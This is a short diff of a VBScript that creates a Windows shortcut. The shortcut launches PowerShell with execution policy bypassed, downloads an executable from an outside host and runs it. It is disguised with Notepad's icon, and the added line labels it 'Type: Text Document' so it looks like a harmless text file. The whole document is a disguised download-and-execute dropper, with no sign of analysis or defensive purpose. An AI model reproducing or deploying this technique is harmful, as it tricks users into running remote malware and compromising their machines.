@@ -8,6 +8,7 @@ Set lnk = WshShell.CreateShortcut(shortcutPath)
 lnk.TargetPath = "powershell.exe"
 lnk.Arguments =  "-ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('http://illmob.org/test.exe','test.exe');./test.exe;"
 lnk.IconLocation = "c:\windows\system32\notepad.exe"
+lnk.Description = "Type: Text Document"
 lnk.Save()
 Set FSO = CreateObject("Scripting.FileSystemObject")
 Set file = FSO.GetFile(shortcutPath)
